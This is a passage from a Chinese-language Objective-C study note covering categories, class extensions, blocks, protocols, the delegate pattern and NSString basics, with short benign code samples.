本类的@property生成的私有属性,只可以在本类的实现中访问.</p><p>​    分类中不能直接访问私有属性 真.</p><p>​    分类可以使用 getter setter 来访问.</p><ol start="4"><li>分类中可以存在和本类同名方法的.</li></ol><p>​    当分类中有和本类中同名的方法的时候,优先调用分类的方法.哪怕没有引入分类的头文件.</p><p>​    如果多个分类中有相同的方法,优先调用最后编译的分类</p><p> -———————————–</p><p> 什么时候需要使用分类.</p><p> 当1个类的方法很多很杂的时候. 当1个类很臃肿的时候.</p><p> 那么这个时候我们就可以使用分类. 将这个类分为多个模块.将功能相似的方法写在同1个模块之中.</p><p> xiahuaxian</p><p> GC与ARC.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#import &lt;Foundation/Foundation.h&gt;</span><br><span class="line">#import &quot;Student.h&quot;</span><br><span class="line">#import &quot;Student+itcast.h&quot;</span><br><span class="line">#import &quot;Student+sb.h&quot;</span><br><span class="line">int main(int argc, const char * argv[])</span><br><span class="line">&#123;</span><br><span class="line">  Student *s1 = [Student new];</span><br><span class="line">  [s1 sayHi];</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="非正式协议"><a href="#非正式协议" class="headerlink" title="非正式协议"></a>非正式协议</h3><ol><li><p>分类的作用在于可以将我们写类分为多个模块.</p><pre><code>    可以不可以为系统的类写1个分类呢?     为系统自带的类写分类 这个就叫做非正式协议.</code></pre></li><li><p>分类的第2个作用:</p><pre><code>    为1个已经存在的类添加方法.</code></pre></li><li><p>NSString类都挺好的. 就是差了1个方法.</p><pre><code>    统计字符串对象中有多少个阿拉伯数字.</code></pre></li></ol><p> 分类的作用</p><p>​         1). 将臃肿的类分为多个模块 方便管理.</p><pre><code>     2). 扩展1个类.</code></pre><h3 id="垃圾回收器"><a href="#垃圾回收器" class="headerlink" title="垃圾回收器"></a>垃圾回收器</h3><ol><li><p>ARC机制垃圾回收机制的区别.</p><pre><code>    GC: 程序在运行的期间,有1个东西叫做垃圾回收器.不断的扫描堆中的对象是否无人使用.</code></pre></li></ol><p>​             Person *p1 = [Person new];</p><p>​             p1 = nil;</p><pre><code>       ARC: 不是运行时. 在编译的时候就在合适的地方插入retain......</code></pre><p>​                     插入的代码足以让对象无人使用的时候 引用计数器为0</p><h3 id="延展"><a href="#延展" class="headerlink" title="延展"></a>延展</h3><ol><li><p>延展: Extension</p><p>   1). 是1个特殊的分类. 所以延展也是类的一部分.</p><p>   2). 特殊之处:</p><p>​     a. <strong>延展这个特殊的分类没有名字.</strong></p><p>​     b. <strong>只有声明没有实现.和本类共享1个实现.</strong></p></li><li><p> 延展的语法</p></li></ol><p>  语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@interface 本类名 ()</span><br><span class="line">@end</span><br></pre></td></tr></table></figure><p>  **没有实现. 和本类共享1个实现.**没有impletation</p><p> 3.为类添加延展的步骤</p><p>  <strong>只有1个.h文件. 文件名称: 本类名_取得文件名.h</strong></p><p><strong>Person_itcast.h</strong></p><p>  这个文件中只有延展的声明.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@interface Person ()</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">@end</span><br></pre></td></tr></table></figure><ol start="4"><li>延展的基本使用.</li></ol><p>  1). 延展的本质是1个分类. 作为本类的一部分.</p><p>​    只不过是1个特殊的分类</p><p>​    没有名字.</p><p>  2). 延展只有声明,没有单独的实现. 和本类共享一个实现.</p><ol start="5"><li>延展和分类的区别</li></ol><p>  1). 分类有名字.延展没有名字 是1个匿名的分类.</p><p>  2). 每1个分类都有单独的声明和实现. 而延展只有声明 没有单独的实现 和本类共享1个实现,</p><p>  3). 分类中只能新增方法. 而延展中任意的成员都可以写.</p><p>  4). 分类中可以写@property 但是只会生成getter setter的声明.</p><p>​    延展中写@property 会自动生成私有属性 也会生成getter setter的声明和实现.</p><ol start="6"><li><p>延展的应用场景.</p><p>1). 要为类写1个私有的@property.</p></li></ol><p>​     生成getter、setter方法只能在类的内部访问 不能在外部访问.</p><p>​     其实,我们可以想: @property生成私有属性、生成getter setter的实现,不要声明.</p><p>   2). 延展100%的情况下不会独占1个文件. 都是将延展直接写在本类的实现文件中.</p><p>​     这个时候,写在延展中的成员,就相当于是这个类的私有成员.只能在本类的实现中访问.</p><p>​     外部不能访问.</p><p>   3). 什么时候使用延展?</p><p>​     当我们<strong>想要为类定义私有成员的时候,就可以使用延展.</strong> 将延展定义在这个类的实现文件中.</p><p>​     <strong>如果想要为类写1个真私有属性,虽然我们可以定义在@implementation之中.但是不要这么写 这样很不规范.</strong>  </p><p>​     写1个延展.将这个私有属性定义在延展中.</p><p>​     如果要为类写1个私有方法,建议将声明写在延展中, 实现写在本类的实现中. 提供代码的阅读性</p><p>​     如果想要为类写1个私有的@property 就直接写在延展就可以了</p><p>   4). <strong>延展天生就是来私有化类的成员的.</strong></p><p>​     如果类的成员只希望在类的内部访问,那么就将其定义在延展中.</p><p>​     如果类的成员允许被外界访问 定义在本类的@interface中.</p><h3 id="block"><a href="#block" class="headerlink" title="block"></a>block</h3><ol><li><p><strong>OC在C的基础之上新增了一些数据类型.</strong></p><p>BOOL</p><p>Boolean</p><p>class</p><p>nil</p><p>SEL</p><p>id</p><p>block</p></li><li><p><strong>block是1个数据类型.</strong></p><p>int double float char …….</p><p>既然是1个数据类型,那么就可以声明这个数据类型的变量. 所以我们完全也可以声明1个block类型的变量.</p><p>不同类型的变量中可以存储不同类型的数据.</p><p>那么block类型的变量中可以存储什么样的数据呢?</p><p>1). block是1个数据类型 所以我们可以声明1个block类型的变量.</p><p>2). block类型的变量中专门存储1段代码. 这段代码可以有参数 可以有返回值.</p></li><li><p><strong>block变量的声明</strong></p><p>1). 虽然block变量中是用来存储1段代码的.但是1个block变量中并不是任意的1段代码都可以存进去的</p></li></ol><p>​     而是有限定的.</p><p>​     也就是说.在声明block变量的时候.<strong>必须要指定这个block变量存储的代码段是否有参数.是否有返回值.</strong></p><p>​     一旦指定以后,这个block变量中就只能存储这样的代码了.</p><p>​     声明了1个block变量.返回值是void 参数是1个int类型的.</p><p>​     这个时候. 这个block变量中就只能存储无返回值并且有1个int参数的代码段.</p><p>   2). 声明block变量的语法格式:</p><p>​     返回值类型 (^block变量的名称)(参数列表);</p><p>​     void (^myBlock1)(); 表示声明了1个block类型的变量叫做myBlock1 这个变量中只能存储没有返回值没有参数的代码段.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int (^myBlock2)(); </span><br><span class="line"></span><br><span class="line">int (^myBlock3)(int num1,int num2);</span><br></pre></td></tr></table></figure><p>   3). 最重要的</p><p>​     声明block变量的时候要指定这个block变量可以存储的代码段的返回值和参数描述.</p><p>​     一旦指定.这个block变量中就只能存储这样的代码段了. 其他格式的代码段无法存储.</p><ol start="4"><li><p><strong>初始化block变量</strong></p><p>1). 原理: 写1个符合block要求的代码段.存储到block变量中就可以了.</p><p>2). 代码段的书写格式:</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    ^返回值类型(参数列表)&#123;</span><br><span class="line">     代码段;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>   3). 写1个无参数无返回值的代码段.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">^void()&#123;</span><br><span class="line"> NSLog(@&quot;我爱你&quot;);</span><br><span class="line"> NSLog(@&quot;我恨你&quot;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​     这个时候,我们就可以将这段代码使用赋值符号存储到 无返回值无参数要求的block变量中.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void (^myBlock1)();</span><br><span class="line">myBlock1 =  ^void()&#123;</span><br><span class="line"></span><br><span class="line">  NSLog(@&quot;我爱你&quot;);</span><br><span class="line"></span><br><span class="line">  NSLog(@&quot;我恨你&quot;);</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​     当然也可以在声明block变量的同时使用符合要求的代码段初始化.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void (^myBlock1)() =  ^void()&#123;</span><br><span class="line"></span><br><span class="line">  NSLog(@&quot;我爱你&quot;);</span><br><span class="line"></span><br><span class="line">  NSLog(@&quot;我恨你&quot;);</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>   4). 有返回值的代码段.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">^int()&#123;</span><br><span class="line"> int num1 = 10 + 20;</span><br><span class="line"> return num1;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​     我们就可以将这段代码赋值给符合要求的block变量.</p><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">int</span> (^myBlock2)() =  ^<span class="keyword">int</span>()&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">int</span> num1 = <span class="number">10</span> + <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> num1;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>   5). 既有参数既有返回值的代码段.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">^int(int num1,int num2)&#123;</span><br><span class="line"> int num3= num1 + num2;</span><br><span class="line"> return num3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​     所以 我们可以将这个代码赋值给符合要求的block变量.</p><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> (^myBlock3)(<span class="keyword">int</span> num1,<span class="keyword">int</span> num2) =  ^<span class="keyword">int</span>(<span class="keyword">int</span> num1,<span class="keyword">int</span> num2)&#123;</span><br><span class="line">     <span class="keyword">int</span> num3= num1 + num2;</span><br><span class="line">     <span class="keyword">return</span> num3;</span><br><span class="line">   &#125;;</span><br></pre></td></tr></table></figure><p>   6). 注意.</p><p>​     赋值给block变量的代码段必须要符合block变量的要求. 否则就会报错.</p><ol start="5"><li><p><strong>如何执行存储在block变量中的代码段.</strong></p><p><strong>语法格式: block变量名();</strong></p><p>有参数就传参数.有返回值就接.</p></li><li><p><strong>关于block的简写.</strong></p><p>1). 如果我们写的代码段没有返回值.那么代码段的void可以省略.</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">void (^myBlock1)() =  ^()&#123;</span><br><span class="line">  NSLog(@&quot;我爱你&quot;);</span><br><span class="line">  NSLog(@&quot;我恨你&quot;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​     注意,我说的是代码段的返回值如果是void可以省略,声明block变量的返回值无论是什么不可以省略.</p><p>   2). 如果我们写的代码段没有参数,那么代码段的小括弧写可以省略.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int (^myBlock2)() =  ^int&#123;</span><br><span class="line">  int num1 = 10 + 20;</span><br><span class="line">  return num1;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​     再次强调: 我们说的是代码段.</p><p>​     所以,当1个代码段既没有参数,也没有返回值的适合,就只写^</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">void (^myBlock1)() =  ^&#123;</span><br><span class="line"> NSLog(@&quot;我爱你&quot;);</span><br><span class="line"> NSLog(@&quot;我恨你&quot;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>   3).声明block变量的时候.如果有指定参数.可以只写参数的类型而不写参数的名称;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int (^myBlock3)(int,int) =  ^int(int num1,int num2)&#123;</span><br><span class="line">    int num3= num1 + num2;</span><br><span class="line">    return num3;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>   注意: 这个地方我们说的是声明block变量的时候 再写代码段的时候 类型和名称都要写.</p><p>   4).<strong>无论代码段是否有返回值.在写代码的时候.可以不写返回值类型 省略.</strong></p><p>​    如果在写代码段的时候,省略了返回值,这个时候系统会自动的确定返回值的类型.</p><p>​    如果代码段中没有返回任何数据 那么它会认为这个代码段是没有返回值的.</p><p>​    如果代码中有返回数据 返回的数据是什么类型 它就会认为这个代码段是什么类型的</p><p>  建议: 仍然按照我们最标准的写法来写block变量和block代码段.因为这样可以提高代码的阅读性.</p><ol start="7"><li><p><strong>简化block变量的复杂定义.</strong></p><pre><code>    1). 问题: 定义block变量的时候.要写好大1串啊! 类型好长.    2). typedef的使用场景: 将1个长类型定义为1个短类型.    3). 我们也可以使用typedef将长的block类型 定义为1个短类型.</code></pre></li></ol><p>​     <strong>typedef 返回值类型 (^新类型)(参数列表);</strong></p><p>​     <strong>typedef void (^NewType)(); 代表重新定义了1个类型叫做NewType 是1个block类型 无参数无返回值的block类型</strong></p><ol start="8"><li><p><strong>关于block块访问外部变量的问题.</strong></p><p>1). 在block代码块的内部可以取定义在外部的变量的值, 定义在外部的局部变量和全局变量.</p><p>2). 在block代码块的内部可以修改全局变量的值.但是不能修改定义在外部的局部变量的值.</p><p>3). <strong>如果你希望我们定义的局部变量可以允许在block代码的内部去修改,那么就为这个局部变量加1个__block的修饰符</strong>.</p></li></ol><p> ——-总结——-</p><p> \1.  block是1个数据类型.</p><p> \2.  block变量是来存储1段代码的.</p><p> \3.  block变量的声明.</p><p> \4.  block变量的初始化</p><p> \5.  执行存储在block变量中的代码.</p><p> \6.  关于4个简写.</p><p> \7.  使用typedef将复杂的block定义简化.</p><p> \8.  访问外部变量的问题.</p><h3 id="block的使用"><a href="#block的使用" class="headerlink" title="block的使用"></a>block的使用</h3><ol><li><p>block是1个数据类型.能不能不能作为函数的参数呢? 当然是可以的.</p></li><li><p>如何为函数定义block类型的参数?</p><pre><code>    a. 就是在小括弧中声明1个指定格式的block变量就可以了.     b. 可以使用typedef简化定义,这样看起来就不会晕了.</code></pre></li><li><p>如何调用带block参数的函数呢?</p><pre><code>    a. 如果要调用的函数的参数是block类型的,那么要求在调用的时候传入1个和形参block要求的代码段.  b. 调用的时候,可以先讲代码段存储到1个block变量中,然后再传递这个block变量</code></pre></li></ol><p>​     也可以直接将符合要求的代码段写在小括弧中传递</p><pre><code>       c. 小技巧. 通过Xcode提示可以快速的生产block代码段的框架.</code></pre><ol start="4"><li><p>将block作为函数的参数可以实现什么样的效果?</p><p>可以将调用者自己写的1段代码 传递到 函数的内部去执行.</p></li><li><p>block也可以作为函数的返回值.</p><pre><code>    当将block作为函数的返回值的时候,**返回值的类型就必须要使用typedef定义的短类型.**</code></pre></li><li><p>block与函数</p><pre><code>    相同点: 都是封装1段代码.   不同点:           1). block是1个数据类型.函数是1个函数.           2). 我们可以声明block类型的变量  函数就只是函数.             3). **block可以作为函数的参数. 而函数不能直接作为函数的参数.**</code></pre></li></ol><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><ol><li>协议:protocol.</li></ol><p>  作用: </p><pre><code>      1). **专门用来声明一大堆方法**. (**不能声明属性,也不能实现方法,只能用来写方法的声明**).        2). 只要某个类遵守了这个协议.就相当于拥有这个协议中的所有的方法声明.而不用自己去定义.</code></pre><ol start="2"><li>协议的声明.</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@protocol 协议名称 &lt;NSObject&gt;</span><br><span class="line"></span><br><span class="line">方法的声明;</span><br><span class="line"></span><br><span class="line">@end</span><br></pre></td></tr></table></figure><pre><code>       新建1个协议的方式.  NewFile OC-File - protocol           协议的文件名: .h 并且只有1个.h文件.          在协议中,只能用来声明方法,协议的作用:就是专门用来写方法声明的.</code></pre><ol start="3"><li><p>类遵守协议.</p><pre><code>    协议就是用来写方法声明的,就是用来被类遵守的.    如果想要让1个类,拥有协议中定义的所有的方法声明.那么就让这个类遵守这个协议.   类只要遵守1个协议,那么这个类就拥有了这些协议中定义的所有的方法的声明了.</code></pre></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@interface 类名 : 父类名 &lt;协议名称&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">@end</span><br><span class="line"></span><br><span class="line">//  : 表示继承.</span><br><span class="line">//  &lt;&gt; 表示遵守的协议.</span><br></pre></td></tr></table></figure><pre><code>       当1个类,遵守了1个协议,那么就相当于这个类拥有了协议中定义的所有的方法的声明.         这个类只是拥有了这个协议中的方法的声明而已. 没有实现.所以 这个类,就应该实现协议中的方法.        如果类不实现协议中的方法,其实也不会报错.编译器只是会报警告.        但是当创建对象,来调用这个没有实现的协议中的方法的时候,就会报错.</code></pre><ol start="4"><li><p>类是单继承. 但是协议可以多遵守</p><pre><code>    1个类只能有1个父类    但是1个类可以同时遵守多个个协议</code></pre></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@interface 类名 : 父类名  &lt;协议名称1,协议名称2......&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">@end</span><br></pre></td></tr></table></figure><pre><code>       当1个类遵守了多个协议之后,就相当于这个类拥有了所有协议中定义的方法的声明.        那么这个类,就应该实现所有协议中的方法        如果不实现,其实也不会报错.编译器只是会报警告.        但是当创建对象,来调用这个没有实现的协议中的方法的时候,就会报错.</code></pre><p>  -——-</p><pre><code>       当1个类遵守了某个协议.就相当于这个类拥有了这份协议中的所有的方法的声明.          但是仅仅只是有方法的声明而已,没有是实现,要类自己去实现.           如果类不实现.编译器不会报错. 只是给1个警告.           当我们创建对象,如果不调用这个协议方法,就不会报错.          如果要调用这个协议方法,那就会报错.</code></pre><ol start="5"><li><p>@required 与 @optional</p><pre><code>    当1个类遵守了1份协议.这个类就拥有这个协议中的所有的方法声明 仅仅是只有声明而已.还要自己实现.    如果不实现呢?也不会报错 只是给1个警告    @required 与 @optional这两个修饰符是专门用来修饰协议中的方法的.    在协议中,如果方法的声明被@required修饰,那么遵守这个协议的类必须要实现这个方法,否则编译器会发出警告.    在协议中,如果方法的声明被@optional修饰,那么遵守这个协议的类如果不实现这个方法.编译器也不会报警告    其实,无论是@required还是@optional你都可以不实现. 编译器是不会报错的. 仍然可以编译 运行.    唯一的区别就是: 当遵守协议的类不实现协议中的方法的时候,@required会给1个警告. @optional警告都木有.    这两个关键字的主要作用:在于程序员沟通,告诉遵守协议的类 哪些方法是必须要实现的,</code></pre></li></ol><p>​         因为这些方法我会调用.</p><pre><code>       默认的是@required</code></pre><ol start="6"><li><p>协议可以从另外1个协议继承,并且可以多继承.</p><pre><code>    协议可以继承另外1个协议.  A 协议 继承了 B协议. 那么A协议中不仅有自己的方法的声明,还有B协议中的方法的声明.    如果有1个类遵守了A协议，那么这个类就拥有了, A、B协议中的所有的方法的声明.    协议之间继承的语法格式</code></pre></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@protocol A协议名称 &lt;B协议名称&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@end</span><br></pre></td></tr></table></figure><pre><code>       代表A协议继承自B协议, A协议中既有自己的方法声明,也有B协议中的方法声明.         NSOBject: 这是1个类. 是所有的OC类的基类. 这个类是苹果早就定义好得.        NSOBject: 这也是1个协议. 也是苹果早就定义好得. 这个协议被NSObject类遵守.</code></pre><p>​            所以,所有的OC对象都拥有这个协议中的所有的方法.</p><p>​            这个协议我们也叫做基协议.</p><pre><code>       写协议的规范: 任何1个协议,必须要间接的或者直接的去遵守这个NSObject基协议.          协议的名称可以和类的名称相同:</code></pre><ol start="7"><li><p>@protocol类型限制.</p><p>  1). 要求某个指针保存的是遵守指定协议的对象.   </p><p>​    NSObject<myProtocol> *obj;</p><p>​    id<myProtocol> *obj;</p><p>  2). 要求某个指针变量保存的是继承了某个类,并遵守了指定协议的对象.</p><p>  3). 属性案例:  男孩子的女朋友</p><p>  4). 为什么要求对象遵守协议?</p><p>​    因为我要调用对象的这个方法 你只有遵守了这个协议才有这个方法.</p><p>  5). 协议与继承,</p><p>​    超人 鸟  飞机 装X飞.</p></li><li><p> 案例: 婴儿饿了要哭 困了要睡 保姆开照顾. 老师也能当保姆.</p></li></ol><h3 id="协议类型限制"><a href="#协议类型限制" class="headerlink" title="协议类型限制"></a>协议类型限制</h3><ol><li><p>请声明1个指针.这个指针可以指向任意的对象,但是要求指向的对象要遵守指定的协议.</p><pre><code>    如果不遵守 最起码要报1个警告.   要求声明1个指针 指向1个遵守了学习协议的对象, 否则最起码要给哥哥1个警告.   NSObject&lt;协议名称&gt; *指针名;   这个时候,这个指针可以指向遵守了指定协议的任意对象. 否则就会报1个警告.   NSObject&lt;StudyProtocol&gt; *obj = [Student new];    当然了完全也可以使用id指针.   id&lt;协议名称&gt; 指针名;   id&lt;StudyProtocol&gt; id1 =  [Student new];</code></pre></li><li><p>声明1个指针变量,要求这个指针变量指向的对象必须遵守多个协议</p><pre><code>    NSObject&lt;StudyProtocol,SBProtocol&gt; *obj1 = [Student new];    id&lt;StudyProtocol,SBProtocol&gt; obj1 = [Student new];</code></pre></li><li><p>定义1个指针,指向遵守了学习协议的学生对象.</p></li><li><p>WHY?</p><pre><code>    1). 遵守了某个协议的类,就相当于这个类拥有了这个协议所定义的行为.    2). 因为我要调用这个对象中的协议方法.</code></pre></li></ol><p>​             只有类遵守了协议,这个类中一定才会有协议方法.</p><h3 id="代理设计模式"><a href="#代理设计模式" class="headerlink" title="代理设计模式"></a>代理设计模式</h3><ol start="0"><li><p>注意</p><pre><code>    我们暂时只是将实现的简单的语法. 应用</code></pre></li><li><p>什么是代理模式.</p><pre><code>    传入的对象,代替当前类完成了某个功能,称为代理模式.</code></pre></li><li><p>利用协议实现代理模式的主要思路.</p><pre><code>    1). 定义1个协议.里面声明代理类需要实现的方法列表. 比如这里的1个代理类需要实现wash cook方法.    2). 创建1个代理类(比如猪猪) 遵守上面的代理协议 并实现方法    3). 在需要代理的类中,定义1个对象属性 类型为id 且遵守代理协议的属性.    4). 在代理的类中,调用代理对象的方法</code></pre></li></ol><p>  代理模式:</p><pre><code>       有1个对象中有1个属性, 这个属性的可以是任意的对象,但是这个对象必须具有指定的行为.</code></pre><p>​            这个时候就可以使用协议.</p><pre><code>       将行为定义在代理之中.          对象的属性的类型 id&lt;协议&gt;          只要遵守了这个协议的对象都可以作为这个类的代理.</code></pre><ol start="3"><li><p>代理设计模式的场合</p><pre><code>       1). 当对象A发生了一些事情,想告知对象B 让对象B称为对象A的代理.                                2). 对象B想监听对象A的一些行为. 让B称为A的代理,                                3). 当对象A无法处理某些场景的时候,想让对象B帮忙处理.</code></pre></li><li><p>婴儿饿了就会哭 哭的时候要有1个人喂他吃奶.  </p><pre><code>    困了就要睡.困的时候就要1个人去哄他睡觉.</code></pre></li></ol><p>​            用代理设计模式.为婴儿找1个可以照顾它的人.</p><p>   Baby</p><p>​    属性:</p><p>​     姓名</p><p>​     年龄.</p><p>​     照顾他的人.</p><p>​    行为:</p><p>​     哭</p><p>​     吃奶</p><p>​     睡觉</p><p>​     犯困的行为.</p><p>   可以照顾这个小孩子的人要求:</p><p>​    喂奶 哄孩子睡觉.</p><h3 id="Foundation框架"><a href="#Foundation框架" class="headerlink" title="Foundation框架"></a>Foundation框架</h3><p> Foundation框架. </p><p> NSString</p><p> NSMutableString</p><p> NSArray</p><p> NSMutableArray</p><p> NSDictionary</p><p> NSMutableDictionary</p><p> NSFileManger</p><p> NSDate</p><p> NSVlue</p><p> NSNumber</p><p> copy</p><ol><li>框架: 就是系统(苹果)或者第三方(其他的一些高手)事先写好了一些很牛X功能的类.</li></ol><p>​             把这些类交给我们使用.这些类的集合我们叫做框架.</p><p>​             框架中有很多很多功能相似的类. 函数库</p><p>   <strong>Foundation框架:</strong>  是1个包 这里面有很多类、函数、定义了一些数据类型.</p><p>​           这个框架中的类都是一些最基础的类. NSString NSObject</p><p>​           其他的框架都是基于Foundation框架的.</p><p>   <strong>UIKit.</strong></p><p>   <strong>AVFoundation.</strong></p><p>   …..</p><ol start="2"><li><p>Foundation框架中的最常用的类. 简单的爆.量大.</p></li><li><p>NSString</p><pre><code>    1). NSString是1个数据类型.保存OC字符串的.</code></pre></li></ol><p>​             NSString的本质是1个类.既然是1个类.</p><p>​             所以,最标准的创建NSString对象的方式:</p><p>​                     NSString *str1 = [NSString new];</p><p>​                     NSString *str2 = [[NSString alloc] init];</p><p>​                     NSString *str3 = [NSString string];</p><p>​             使用这种方式创建的字符串是1个空的字符.  @””</p><p>​             <strong>NSString对象就是用来存储字符串</strong>.</p><pre><code>       2). NSString是OC中最常用的1个类了.**所以OC提供了一种更为快速的创建字符串对象的方式.**</code></pre><p>​             <strong>使用前缀@</strong></p><p>​             @”jack”; 本质上这是1个NSString对象.这个NSString对象中存储的是”jack”这个字符串.</p><p>​            NSString *str1 = @”rose”;</p><p>​            1).  <strong>@”rose”本质上是1个NSString对象,这个对象中存储的是字符串”rose”.</strong></p><pre><code>        2).  将这个字符串对象的地址返回赋值给str1指针.</code></pre><p>​             <strong>%p: 打印指针变量的值.打印地址.</strong></p><p>​             <strong>%@:  打印指针指向的对象.</strong></p><ol start="4"><li><p>NSString的恒定性.</p><pre><code>    1). 当我们使用简要的创建字符串对象的时候.也就是使用1个OC字符串常量来初始化字符串指针的时候，**这个字符串对象是存储在 常量区(数据段) 的.**</code></pre></li></ol><p>​             NSString *str = @”jack”;</p><p>​             <strong>当我们调用NSString的类方法来创建对象的时候，存储在堆区</strong></p><p>​             NSString *str =  [NSString stringWithFormar:@”jack”];</p><pre><code>         NSString *str1 = [NSString new];           2). 当在内存中创建1个字符串对象以后.这个字符串对象的内容就无法更改.</code></pre><p>​             当我们重新为字符串指针初始化值的时候.并不是修改原来的字符串对象 </p><p>​             而是重新的创建1个字符串对象 将这个字符串对象的地址重新复制给字符串指针变量.</p><pre><code>       3). 当系统准备要在内存中创建字符串对象的时候.会先检查内存中是否有相同内容的字符串对象.</code></pre><p>​             如果有,直接指向. 如果没有才会重新创建.</p><pre><code>       4). 存储在常量区的数据不会被回收. 所以存储在常量区的字符串对象也不会被回收.</code></pre><h3 id="NSString常用成员"><a href="#NSString常用成员" class="headerlink" title="NSString常用成员"></a>NSString常用成员</h3><ol><li><p>NSString是1个类.那么肯定其中有很多的方法.</p></li><li><p>使用频率最最高的几个方法.</p><pre><code>    1). 使用拼接的方式创建1个NSString对象.</code></pre></li></ol><p>​             + (instancetype)stringWithFormat:(NSString *)format, … </p><p>​            NSString* str1=[NSString StringWithFormat:@”大家好我叫%s，我今年%d虽了”，name,age];</p><pre><code>       2). 得到字符串的长度.</code></pre><p>​             @property (readonly) NSUInteger <strong>length</strong>;</p><pre><code>       3). 得到字符串中指定下标的字符.</code></pre><p>​             - (unichar)<strong>characterAtIndex</strong>:(NSUInteger)index;</p><pre><code>         返回值是unichar类型的 要打印的话使用%C      4). 判断两个字符串的内容是否相同.</code></pre><p>​             a. 能否使用 == 来判断两个OC字符串的内容是否相同.</p><p>​             b. == 运算符的作用: 